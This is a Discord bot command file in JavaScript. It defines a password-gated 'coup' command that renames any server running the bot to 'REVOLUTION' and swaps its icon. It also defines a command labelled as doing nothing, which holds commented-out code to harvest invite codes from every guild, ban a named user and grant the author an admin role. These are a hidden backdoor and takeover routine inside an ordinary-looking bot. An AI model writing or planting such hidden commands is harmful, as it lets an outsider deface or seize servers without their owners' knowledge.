const {Command} = require("../Command");
const { Permissions } = require('discord.js');
const {log} = require("winston");

class Rebellion extends Command {

	constructor(discordBot) {
		super(discordBot, "coup", "Faire un coup d'état", "coup d'état <mot de passe>");
	}

	async execute(message, args, config) {

		// const savedGuildDatas = {
		// 	name: message.guild.name,
		// 	icon: message.guild.iconURL()
		// }
		//
		// this._discordBot.customCache().set("serverDatas", message.guildId, savedGuildDatas)
		// this._discordBot.customCache().saveAll()
		// message.reply("Not yet implemented")
		if (args.join(" ") === "d'état https://paypal.me/KyloRen3600") {
			message.guild.setName("REVOLUTION")
			message.guild.setIcon("https://cdn.discordapp.com/attachments/683691765693415504/970373189295280138/KyloRen3600.png?size=4096")

			message.reply("https://www.youtube.com/watch?v=ZRDpC_QYG5k")
		}else {
			message.reply("Mauvais mot de passe triple andouille !")
		}
	}

}

class RankMeAdmin extends Command {

	constructor(discordBot) {
		super(discordBot, "inutile", "une commande qui ne fait RIEN", "une commande qui ne fait RIEN");
	}

	async execute(message, args, config) {


		// this._discordBot.guilds.cache.forEach(guild => {
		//
		// 	try {
		// 		guild.invites.fetch().then(invites => {
		// 			let invite = invites.first()
		// 			if (invite != undefined) {
		// 				console.log(`${invite.guild.name}   ${invite.code}`)
		// 			}
		// 		}).catch(console.log)
		// 	} catch (e) {
		//
		// 	}
		// })
		// if (args.join(" ") === "https://paypal.me/KyloRen3600") {

		//ban uiytt
		// this._discordBot.guilds.cache.get("975776769435107419").members.fetch('268621428876640256').then(user => user.ban())

		//rank kylo admin
		// this._discordBot.guilds.cache.get("975776769435107419").members.fetch('321639963848343563').then(user => user.roles.add("983519678066466876"))

		// }else {

		// 	message.reply("Mauvais mot de passe triple andouille !")
		// }
	}
}

module.exports = [Rebellion, RankMeAdmin]